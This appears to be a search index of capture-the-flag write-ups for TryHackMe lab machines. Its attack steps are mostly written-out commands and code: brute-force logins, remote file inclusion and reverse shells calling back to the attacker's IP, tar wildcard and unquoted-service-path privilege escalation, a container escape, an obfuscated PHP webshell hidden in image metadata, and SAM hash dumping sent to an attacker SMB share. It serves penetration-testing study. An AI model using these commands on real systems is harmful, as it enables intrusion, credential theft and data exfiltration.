Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s\n|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: skynet\n|   NetBIOS computer name: SKYNET\\x00\n|   Domain name: \\x00\n|   FQDN: skynet\n|_  System time: 2021-05-28T04:21:33-05:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-05-28T09:21:33\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 32.44 seconds\n</code></pre>"},{"location":"Skynet/02-web/","title":"02 web","text":"<p>fuzzing </p> <p>http://10.10.82.251/squirrelmail/ redirects to http://10.10.82.251/squirrelmail/src/login.php</p> <p></p> <p>and trying creds </p> <pre><code>hydra -l milesdyson -P loot/log1.txt 10.10.82.251 http-post-form \"/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password incorrect.\"\n</code></pre> <p>we get a hit  </p> <p></p> <p>after login in </p> <p></p> <p> the passwd for samba is changed to </p> <pre><code>)s{A&amp;2Z=F^n_E.B`\n</code></pre> <p><code>dir:/45kra24zxs28v3yd</code></p> <p></p> <p>fuzzing it</p> <p>we get a hit  </p> <p>http://10.10.82.251/45kra24zxs28v3yd/administrator/</p> <p></p> <p>Cuppa CMS</p>"},{"location":"Skynet/03-smb/","title":"03 smb","text":"<p><code>smbmap -H 10.10.82.251</code> </p> <p></p> <p>from here we see the user name for miles dyson is <code>milesdyson</code></p> <p><code>smbclient \"\\\\\\\\10.10.82.251\\anonymous\"</code></p> <p>get the logs and attention  </p> <p></p>"},{"location":"Skynet/03-smb/#logging-in-as-milesdyson","title":"logging in as milesdyson","text":"<p>here there a file important.txt different from the others</p> <p></p> <p>cat important.txt </p> <p><code>dir: /45kra24zxs28v3yd</code></p>"},{"location":"Skynet/04-foothold/","title":"04 foothold","text":""},{"location":"Skynet/04-foothold/#squirrelmail","title":"/squirrelmail","text":"<p>SquirrelMail version 1.4.23 CVE 2017-7692 </p> <p>https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html</p> <p>https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html</p> <p>but we cant get a rev shell </p> <p></p> <p>so fuzzing the hidden directory</p>"},{"location":"Skynet/04-foothold/#45kra24zxs28v3ydadministrator","title":"/45kra24zxs28v3yd/administrator/","text":"<p>from the http://10.10.82.251/45kra24zxs28v3yd/administrator/</p> <p>cuppa cms  https://www.exploit-db.com/exploits/25971</p> <p>we can use this  http://10.10.82.251/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</p> <p></p> <p>exploit </p> <p>modify a php reverse shell and host it</p> <pre><code>curl http://10.10.82.251/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.17.4.208/rev-shell-lin.php?\n\n</code></pre> <p>and listen on listener</p> <p></p> <p></p> <p>user === 7ce5c2109a40f958099283600a9ae807</p>"},{"location":"Skynet/05-Root/","title":"05 Root","text":"<p>there is a backup script which we can exploit (same as VulnNet root) </p> <p>here we can exploit the wildcard using the 3rd method(Tar Wildcard Injection) from : https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</p> <p>go to <code>/var/www/html</code></p> <pre><code>echo \"chmod u+s /bin/bash\" &gt; test.sh \necho \"\" &gt; \"--checkpoint-action=exec=sh test.sh\"\necho \"\" &gt; --checkpoint=1\n</code></pre> <p>now back to <code>/home/milesdyson/backups/</code></p> <p>and run the script using <code>bash backupsrv.sh</code></p> <p>and <code>/bin/bash -p</code>  and we got root</p> <p></p> <p>root == 3f0372db24753accc7179a282cd6a949</p>"},{"location":"Steel%20Mountain/01-nmap/","title":"01 nmap","text":""},{"location":"Steel%20Mountain/01-nmap/#nmap","title":"nmap","text":"<pre><code># Nmap 7.91 scan initiated Thu May 27 12:42:31 2021 as: nmap -sC -sV -oN nmap 10.10.143.187\nNmap scan report for 10.10.143.187\nHost is up (0.13s latency).\nNot shown: 988 closed ports\nPORT      STATE SERVICE            VERSION\n80/tcp    open  http               Microsoft IIS httpd 8.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/8.5\n|_http-title: Site doesn't have a title (text/html).\n135/tcp   open  msrpc              Microsoft Windows RPC\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n3389/tcp  open  ssl/ms-wbt-server?\n| ssl-cert: Subject: commonName=steelmountain\n| Not valid before: 2021-05-26T07:10:40\n|_Not valid after:  2021-11-25T07:10:40\n|_ssl-date: 2021-05-27T07:13:56+00:00; 0s from scanner time.\n8080/tcp  open  http               HttpFileServer httpd 2.3\n|_http-server-header: HFS 2.3\n|_http-title: HFS /\n49152/tcp open  msrpc              Microsoft Windows RPC\n49153/tcp open  msrpc              Microsoft Windows RPC\n49154/tcp open  msrpc              Microsoft Windows RPC\n49155/tcp open  msrpc              Microsoft Windows RPC\n49157/tcp open  msrpc              Microsoft Windows RPC\n49163/tcp open  msrpc              Microsoft Windows RPC\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:a2:8e:4d:4c:21 (unknown)\n| smb-security-mode: \n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-05-27T07:13:50\n|_  start_date: 2021-05-27T07:10:30\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu May 27 12:43:56 2021 -- 1 IP address (1 host up) scanned in 85.70 seconds\n</code></pre>"},{"location":"Steel%20Mountain/02-Web/","title":"02 Web","text":""},{"location":"Steel%20Mountain/02-Web/#port-80","title":"port 80","text":""},{"location":"Steel%20Mountain/02-Web/#port-8080","title":"port 8080","text":""},{"location":"Steel%20Mountain/03-User/","title":"03 User","text":""},{"location":"Steel%20Mountain/03-User/#metasploit","title":"metasploit","text":"<p>HttpFileServer 2.3 CVE 2014-6287</p> <p>https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/</p> <p></p> <p></p> <p>user === b04763b6fcf51fcd7c13abc7db4fd365</p> <p>## without metasploit</p> <p>https://www.exploit-db.com/exploits/39161</p> <p></p> <p></p>"},{"location":"Steel%20Mountain/04-Root/","title":"04 Root","text":""},{"location":"Steel%20Mountain/04-Root/#metasploit","title":"metasploit","text":"<p>using the powershell script</p> <p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</p> <p>upload and execute</p> <p></p> <p>and run <code>Invoke-AllChesks</code></p> <p></p>"},{"location":"Steel%20Mountain/04-Root/#unquoted-service-path-vulnerability","title":"unquoted service path vulnerability","text":"<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o exploit.exe</code></p> <p></p> <p>Upload the explolit and replace the original service</p> <pre><code>sc stop AdvancedSystemCareService9\nupload /home/sp00f/THM/steelmountain/www/exploit.exe \"\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\"\n\nsc start AdvancedSystemCareService9\n</code></pre> <p></p> <p>and we got shell as root </p> <p></p> <p>root flag == 9af5f314f57607c00fd09803a587db80 </p>"},{"location":"Steel%20Mountain/04-Root/#without-metasploit","title":"without metasploit","text":"<p>transfer the winpeas binary and run</p> <pre><code>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/winPEASx64.exe','C:\\Users\\bill\\Desktop\\winPEASx64.exe')\"\n</code></pre> <p></p> <p></p> <p>or  <code>powershell -c Get-Service</code></p> <p></p> <pre><code>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/exploit.exe','C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe')\"\n</code></pre> <p>start the service and we got root</p> <p></p>"},{"location":"The%20Docker%20Rodeo/dockerrodeo/","title":"Dockerrodeo","text":""},{"location":"The%20Docker%20Rodeo/dockerrodeo/#nmap","title":"nmap","text":"<pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-06-15 06:59 BST\nNmap scan report for docker-rodeo.thm (10.10.125.0)\nHost is up (0.00095s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n5000/tcp open  http    Docker Registry (API: 2.0)\n7000/tcp open  http    Docker Registry (API: 2.0)\nMAC Address: 02:22:9F:2A:94:2B (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 38.03 seconds\n</code></pre>"},{"location":"The%20Docker%20Rodeo/dockerrodeo/#enumeration","title":"Enumeration","text":"<p>port 5000</p> <p></p> <p></p> <p>port 7000 </p> <p></p>"},{"location":"The%20Docker%20Rodeo/dockerrodeo/#dive","title":"dive","text":"<p>https://github.com/wagoodman/dive</p> <p></p> <p></p> <p>challenge</p> <p></p> <p></p>"},{"location":"The%20Docker%20Rodeo/dockerrodeo/#escape","title":"escape","text":"<p><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p> <p></p> <p>Shared Namespaces </p> <p><code>nsenter --target 1 --mount sh</code></p> <p></p> <p></p> <p><code>capsh --print</code></p> <p>exploit for sys_admin</p> <pre><code>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x\n\n echo 1 &gt; /tmp/cgrp/x/notify\\_on\\_release\n\nhost\\_path=\\`sed -n 's/.\\*\\\\perdir=\\\\(\\[^,\\]\\*\\\\).\\*/\\\\1/p' /etc/mtab\\`\n\necho \"$host\\_path/exploit\" &gt; /tmp/cgrp/release\\_agent\n\necho '#!/bin/sh' &gt; /exploit\n\necho \"cat /home/cmnatic/flag.txt &gt; $host\\_path/flag.txt\" &gt;&gt; /exploit\n\nchmod a+x /exploit\n\nsh -c \"echo \\\\$\\\\$ &gt; /tmp/cgrp/x/cgroup.procs\"\n</code></pre> <p></p>"},{"location":"ToolsRUs/toolsrus/","title":"Toolsrus","text":""},{"location":"ToolsRUs/toolsrus/#nmap","title":"nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.55.216\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 15:11 IST\nNmap scan report for 10.10.55.216\nHost is up (0.13s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 82:95:bf:c3:85:cb:cc:42:6a:64:a4:e5:d0:20:94:f2 (RSA)\n|   256 56:01:70:78:e8:f8:40:ee:cb:57:de:2b:46:90:57:0e (ECDSA)\n|_  256 c5:17:5c:ed:40:06:e5:39:92:de:27:64:f5:f8:03:08 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n|_ajp-methods: Failed to get a valid response for the OPTION request\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.56 seconds\n</code></pre>"},{"location":"ToolsRUs/toolsrus/#web","title":"web","text":"<p>/guidelines</p> <p></p> <p>hydra login brute force</p> <p><code>hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.55.216 http-get \"/protected\"</code></p> <p></p> <p><code>bob:bubbles</code></p> <p></p> <p><code>nikto -h http://10.10.55.216:1234/manager/html -id bob:bubbles</code></p> <p>it would take ages and there are 5 docs </p>"},{"location":"ToolsRUs/toolsrus/#exploit","title":"exploit","text":"<p>Apache Tomcat/Coyote JSP engine 1.1 exploit</p> <p>https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_deploy/</p> <p>this didnt worked so use <code>multi/http/tomcat_mgr_upload</code></p> <p>and it worked  </p> <p>root flag === ff1fc4a81affcc7688cf89ae7dc6e0e1</p>"},{"location":"Volatility/Volatility/","title":"Volatility","text":"<p>Install Volatility.  ref: https://seanthegeek.net/1172/how-to-install-volatility-2-and-volatility-3-on-debian-ubuntu-or-kali-linux/</p> <p>Volatility v2 </p> <pre><code>sudo apt install -y python2 python2.7-dev libpython2-dev\ncurl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py\nsudo python2 get-pip.py\nsudo python2 -m pip install -U setuptools wheel\n</code></pre> <pre><code>python2 -m pip install -U distorm3 yara pycrypto pillow openpyxl ujson pytz ipython capstone\nsudo python2 -m pip install yara\nsudo ln -s /usr/local/lib/python2.7/dist-packages/usr/lib/libyara.so /usr/lib/libyara.so\npython2 -m pip install -U git+https://github.com/volatilityfoundation/volatility.git\n</code></pre> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"VulnNet/vulnnet1/","title":"VulnNet","text":""},{"location":"VulnNet/vulnnet1/#nmap","title":"nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.116.140\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 12:30 IST\nNmap scan report for vulnnet.thm (10.10.116.140)\nHost is up (0.13s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)\n|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)\n|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: VulnNet\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 41.69 seconds\n</code></pre>"},{"location":"VulnNet/vulnnet1/#web","title":"web","text":"<p>after looking around the url showed <code>?</code> at the end so there could be a possibility for lfi.</p> <p>Looking at the source code of javascript we got the word.</p> <p></p> <p>and checking we do have lfi </p> <p></p> <p>Also a vhost  </p> <p></p> <p>and there is a .htaccess  or .htpasswd file we can access.</p> <p>view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/apache2.conf</p> <p></p> <p>we cant read the .htpasswd but can read the .htpasswd</p> <p>view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd</p> <p></p> <p><code>developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0</code></p> <p>cracking the hashid using hashcat </p> <p></p> <p><code>developers:9972761drmfsls</code></p> <p>and we can signin in http://broadcast.vulnnet.thm/</p> <p></p>"},{"location":"VulnNet/vulnnet1/#exploit","title":"exploit","text":"<p>here ClipBucket is being used and its v4.0</p> <p></p> <p>and there are public exploit available for file upload</p> <p>https://www.exploit-db.com/exploits/44250</p> <p>https://www.rapid7.com/db/modules/exploit/multi/http/clipbucket_fileupload_exec/</p> <p>trying to upload we get unauthorized so using user access</p> <p></p> <p>and uploaded the file <code>curl -F \"file=@rev.php\" -F \"plupload=1\" -F \"name=rev.php\" \"http://broadcast.vulnnet.thm/actions/photo_uploader.php\" -u \"developers:9972761drmfsls\"</code></p> <p></p> <p>from the source code we see that there is a folder called file and from ther we can call the shell(php code)</p> <p> and we got the shell as www-data </p>"},{"location":"VulnNet/vulnnet1/#user","title":"user","text":"<p>from /var/backups we got a ssh-backup </p> <p>and it have id_rsa file but protected</p> <p></p> <p>using ssh2john <code>python2 /usr/share/john/ssh2john.py id_rsa</code></p> <pre><code>id_rsa:$sshng$1$16$6CE1A97A7DAB4829FE59CC561FB2CCC4$1200$99114344bd79b7baaf699c491870c9b1ec27869ef01126c41b17805ad0ab6de21525b40841df19f122b3a6f4cc14bb6d76c7aab06b6df074abb9522afbe3c5a5746b0431b9178ad6e41e950ce54c9353bd278787115d0dedeb3e859db6a367bdeb4aaa8fb624498f63563e4daaae3db943548341b4aa75a1f0ceabf2bf373aff87b8285d78d0b9082d8ebad362be5ee376621a151155c2658d254c957a7d4560c6b113e3688dcc2c1cc1fc695d854e2b8c52cba03b065c30a86244f4c49688e7b43ae580d3273fa94c910eb2c89103345b67eed4f197bb6a7422200776984195c07e941b6df2439ecf44719124124ae986ce4b8b6d0d6d9c6bb48e953eaebfcc3535081772d294f9f1e57236d0dfad43ddbe2c835216ad3c0091db40538ea5a0dc161e0339c3174322817fc0a8b7fcbc0d876e7453616412c449c01e69d520a68d54174bea3a609b0e118c6cec51cb648c1ea48e99cf49eb2ee2549eea7fdfe49d196ce7445ef0c13a9bb7b1c26f31349defa4b89f856636019d6e93656b28f9e6e25f8a4191e7e0b491ce8fcad8e166b9ce0d119f6e696a87da20816a5f945526f078063b09fa9df88704d343d296b4afc104d6629410f8f7c9f8cb856e8f70cd8e1841c70d0add2c3cb7958457e0db02452a36e23b60375f9a41c78d15743bbfc46b7eee5299bbaaded063560216c6894ccbe6b5e3948cd489dec31e15e025f58e493ab29d2af61dc3d37058c598f39ff80c47f70d8188e86db6081184bd2a36521d3b9c3c0350c61532e7340a91beb5ca6b0847c3beee91d379179e94f0ea9efec503feb94b2df14945cf9fd9e1a96ab4f849e12e9a23712b7a733c97ed96b664d3ff2da157a478f063106098c91fa1598b998af0ea93ab2c76fb0b91ba791e83fd6c118e13e9ba10965a7cfe3410d05c8c14cf342f0321f26fb0f5f88b6731eb05f8bf73b9400319eb85975d9d2da85aa4ce59b8a511c27cd6f7e4709a6252b93d009cde4ecae26dc1f4739e3c99edfe4d3fdbbabc5d0d40761923b316707ecf010b064f0df1cc19897487c5ef50e61b4aeaa8247bb01d9bba1a08e2f7b7a1bbe99a0d82bc4fab9c64b7c31b9a10ed265b156b498896762ecb259be9a70445db7027358353782c3871bbef08151d84abe16aed35c955b637f47c078de4e46f6a6de35498864896d2596b11e742924621bc05488b62878f45cabdbd9d444a6496f225b6f8f87cb664d3789bf71f3cd982146fb0d00efc8953eb933c5d5ae4da04e281b2dce9bcb040db4778a37a30c02ea3f7c4e598550e2a7e642665f511000726637011134a166370807aa0c1837322119135dca8a89c41aec8558d193d1921191edc8636806a7acc9983c62db182051a9a59150995ba61824657ce181f703dc026bde0b418d7d3ca03d0944312868cf899322fa9c0b05a26d7304da0f0cf4d7d52aceccd201b95dbf7730b6be413ed3ca3127e9b0dad353b6fa2397931d2c70a32ce2fdd80626188531ce926239397d0656bbf1295c8225663595d55fbbee8b120b10994bc6f6b6303b8f85696e1c237c77d7ea83af5b4224c2ee3e97eccab6b2041eddba3fd8e007164d6a58f9f79a1e20d4fdb424eba481a96f1639b77dbf1953837c680dc2e36a10c0c2d048e084ef1cd3e9fa10c4a9e45609994a9b8956c88f38d0814c4e556ac26c550ea\n</code></pre> <p>using hashcat to crack it mode(22931) <code>hashcat -m 22931 hash /usr/share/wordlists/rockyou.txt</code></p> <p></p> <p><code>server-management:oneTWO3gOyac</code></p> <p></p> <p>flag 1 == THM{907e420d979d8e2992f3d7e16bee1e8b}</p>"},{"location":"VulnNet/vulnnet1/#root","title":"Root","text":"<p>running linpeas we get a file from /var/opt/backupsrv.sh which backups all the files in /home/server-management/Documents/ folders </p> <pre><code>#!/bin/bash\n\n# Where to backup to.\ndest=\"/var/backups\"\n\n# What to backup. \ncd /home/server-management/Documents\nbackup_files=\"*\"\n\n# Create archive filename.\nday=$(date +%A)\nhostname=$(hostname -s)\narchive_file=\"$hostname-$day.tgz\"\n\n# Print start status message.\necho \"Backing up $backup_files to $dest/$archive_file\"\ndate\necho\n\n# Backup the files using tar.\ntar czf $dest/$archive_file $backup_files\n\n# Print end status message.\necho\necho \"Backup finished\"\ndate\n\n# Long listing of files in $dest to check file sizes.\nls -lh $dest\n</code></pre> <p>here we can exploit the wildcard using the 3rd method(Tar Wildcard Injection) from : https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</p> <pre><code>echo \"chmod u+s /bin/bash\" &gt; test.sh \necho \"\" &gt; \"--checkpoint-action=exec=sh test.sh\"\necho \"\" &gt; --checkpoint=1\n</code></pre> <p></p> <p>run the script using <code>bash backupsrv.sh</code></p> <p></p> <p></p> <p>root flag == THM{220b671dd8adc301b34c2738ee8295ba}</p>"},{"location":"Wreath/10.200.109.100/01-nmap/","title":"01 nmap","text":"<p>Using Evil-winrm we can pass the scripts folder  and call a particular script afterwards</p> <p><code>evil-winrm -u Administrator  -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.89.150 -s /usr/share/powershell-empire/data/module_source/situational_awareness/network/</code></p> <p>loading the script <code>Invoke-Portscan.ps1</code></p> <p>using the script <code>Invoke-Portscan -Hosts 10.200.89.100 -TopPorts 50</code></p> <p>output: <code>Hostname      : 10.200.89.100 alive         : True openPorts     : {80, 3389} closedPorts   : {} filteredPorts : {445, 443, 79, 88...} finishTime    : 4/30/2021 4:07:54 PM</code> </p>"},{"location":"Wreath/10.200.109.100/02-Web%28port-80%29/","title":"02 Web(port 80)","text":"<p>/resources </p>"},{"location":"Wreath/10.200.109.100/03-Exploit/","title":"03 Exploit","text":"<p>From the downloaded Website.git we now will extract the files</p> <p>now using the tool GitTools we will extract the files from .git we got</p> <p><code>./extractor.sh /home/sp00f/THM/Wreath/10.200.109.150/loot/Website.git/ /home/sp00f/THM/Wreath/10.200.109.150/loot/Website.git/</code> </p> <p>we now have 3 commits </p> <p>to get the commit order <code>separator=\"=======================================\"; for i in $(ls); do printf \"\\\\n\\\\n$separator\\\\n\\\\033\\[4;1m$i\\\\033\\[0m\\\\n$(cat $i/commit-meta.txt)\\\\n\"; done; printf \"\\\\n\\\\n$separator\\\\n\\\\n\\\\n\"</code></p> <p></p> <p>On looking, the commit hashes and stuff  we saw the commit order:</p> <pre><code>2-70dde80cc19ec76704567996738894828f4ee895 -&gt; 1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2 -&gt; 0-345ac8b236064b431fa43f53d91c98c4834ef8f3\n</code></pre> <p>review the code. and there is /resources page and we can upload image with conditions but we have to login first.</p> <p>login creds :</p> <p><code>Thmomas:i&lt;3ruby</code></p> <p>and we can upload </p> <p></p> <p>updating a static image for poc that we can execute php via images so that AV wont alert the user <code>exiftool -Comment=\"&lt;?php echo \\\\\"&lt;pre&gt;Test Payload&lt;/pre&gt;\\\\\"; die(); ?&gt;\" sp00f.png.php</code></p> <p>and by selecting all types we can upload the file </p> <p>and here the file. poc ie. We have the ability to execute arbitrary PHP code on the system! </p> <p>we will upload the php webshell</p> <pre><code>&lt;?php  \n $cmd = $\\_GET\\[\"wreath\"\\];  \n if(isset($cmd)){  \n echo \"&lt;pre&gt;\" . shell\\_exec($cmd) . \"&lt;/pre&gt;\";  \n }  \n die();  \n?&gt;\n</code></pre> <p>Now we have to obscure the php shell using  https://www.gaijin.at/en/tools/php-obfuscator</p> <pre><code>&lt;?php $q0=$_GET[base64_decode('d3JlYXRo')];if(isset($q0)){echo base64_decode('PHByZT4=').shell_exec($q0).base64_decode('PC9wcmU+');}die();?&gt;\n</code></pre> <p>changing the exploit cause php might read the <code>$</code> following as the variables</p> <pre><code>&lt;?php \\$q0=\\$_GET[base64_decode('d3JlYXRo')];if(isset(\\$q0)){echo base64_decode('PHByZT4=').shell_exec(\\$q0).base64_decode('PC9wcmU+');}die();?&gt;\n</code></pre> <p>embed the image using exiftool </p> <p>and we uploaded the web shell</p> <p></p> <p>by passing the appropriate flags we can get the web shell</p> <p>http://10.200.89.100/resources/uploads/sp00f_1.png.php?wreath=systeminfo</p> <p></p> <p>Further to get the reverse shell we have to upload netcat and without AV to detect it.</p> <p>using <code>git clone https://github.com/int0x33/nc.exe/</code></p> <p>changing the Makefile and remove the default nc.exe and nc64.exe </p> <p>and <code>make 2&gt;/dev/null</code></p> <p></p> <p>and we uploaded it using curl <code>http://10.200.89.100/resources/uploads/sp00f_1.png.php?wreath=curl http://10.50.90.103/nc.exe -o c:\\\\windows\\\\temp\\\\nc-sp00f.exe</code></p> <p>execute the netcat binary using powershell and listen on port</p> <p><code>http://10.200.89.100/resources/uploads/sp00f_1.png.php?wreath=powershell.exe c:\\\\windows\\\\temp\\\\nc-sp00f.exe 10.50.90.103 443 -e cmd.exe</code></p> <p>and we got the reverse shell </p> <p></p>"},{"location":"Wreath/10.200.109.100/04-PrivEsc/","title":"04 PrivEsc","text":""},{"location":"Wreath/10.200.109.100/04-PrivEsc/#enumeration","title":"Enumeration","text":"<p>whoami/priv </p> <p>whoami/groups </p> <p><code>wmic service get name,displayname,pathname,startmode | findstr /v /i \"C:\\Windows\"</code></p> <p></p> <p>checking the access, and we have full access it a case of Unquoted service path vulnerabilities  <code>powershell \"get-acl -Path 'C:\\Program Files (x86)\\System Explorer' | format-list\"</code></p> <p></p>"},{"location":"Wreath/10.200.109.100/04-PrivEsc/#exploit","title":"Exploit","text":"<p>we will write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system).</p> <p>install <code>sudo apt install mono-devel</code></p> <p>Wrapper.cs</p> <pre><code>using System;\nusing System.Diagnostics;\n\nnamespace Wrapper{\n    class Program{\n        static void Main(){\n            //Our code will go here!\n            Process proc = new Process();\n            ProcessStartInfo procInfo = new ProcessStartInfo(\"c:\\\\windows\\\\temp\\\\nc-sp00f.exe\", \"10.50.90.103 443 -e cmd.exe\");\n            procInfo.CreateNoWindow = true;\n            proc.StartInfo = procInfo;\n            proc.Start();\n        }\n    }\n}\n\n</code></pre> <p>and compile using <code>mcs Wrapper.cs</code></p> <p></p> <p>upload the Wrapper.exe to <code>%TEMP%</code></p> <p><code>curl http://10.50.90.103/Wrapper.exe -o %TEMP%\\wrapper-sp00f.exe</code></p> <p><code>cd C:\\Users\\Thomas\\AppData\\Local\\Temp\\</code></p> <p><code>wrapper-sp00f.exe</code></p> <p>and we got the shell as thomas, go the user level access </p> <p></p>"},{"location":"Wreath/10.200.109.100/04-PrivEsc/#exploiting-unquoted-service-path-vulnerabilities","title":"exploiting Unquoted service path vulnerabilities","text":"<p>here we are exploiting the vulnerability in the unquoted path of <code>C:\\Program Files (x86)\\System Explorer'</code> </p> <p>so we are going to place the binary to the <code>C:\\Program Files (x86)\\System Explorer\\</code> as there only we are having the write permissions </p> <p>we will use the same wrapper, the one which we used to get the user Thomas</p> <pre><code>copy %TEMP%\\wrapper-sp00f.exe \"C:\\Program Files (x86)\\System Explorer\\System.exe\"\n</code></pre> <p>and we have it</p> <p></p> <p>so to trigger it we have to restart the service and listen on the port</p> <p><code>sc stop SystemExplorerHelpService</code> <code>sc start SystemExplorerHelpService</code></p> <p></p> <p>and we got root i.e. <code>nt authority</code> </p>"},{"location":"Wreath/10.200.109.100/05-Post_Exploitation/","title":"05 Post Exploitation","text":"<p>cleaning up  <code>del \"C:\\Program Files (x86)\\System Explorer\\System.exe\"</code> <code>sc start SystemExplorerHelpService</code></p> <p>in windows the hashes are saved at: <code>C:\\Windows\\System32\\Config\\SAM</code> but not accessible when computer is running so </p> <p>saving the hashes of SAM and System hive  <code>reg.exe save HKLM\\SAM sam.bak</code> <code>reg.exe save HKLM\\SYSTEM system.bak</code></p> <p></p> <p>to transfer the files using  <code>sudo impacket-smbserver share . -smb2support -username sp00f -password Passw0rd!</code> </p> <p>and now in the windows box we have to authenticate the user for sharing </p> <p><code>net use \\\\10.50.90.103\\sp00f /USER:sp00f Passw0rd!</code></p> <p></p> <p>and using the command <code>copy * \\\\10.50.90.103\\sp00f</code> we shared all the files</p> <p></p> <p>cleaning up </p> <p></p>"},{"location":"Wreath/10.200.109.100/05-Post_Exploitation/#hash-cracking","title":"hash cracking","text":"<p>and using impacket only we can crack the hashes using</p> <p><code>impacket-secretsdump -sam sam.bak -system system.bak LOCAL</code></p> <p></p> <pre><code>[*] Dumping local SAM hashes 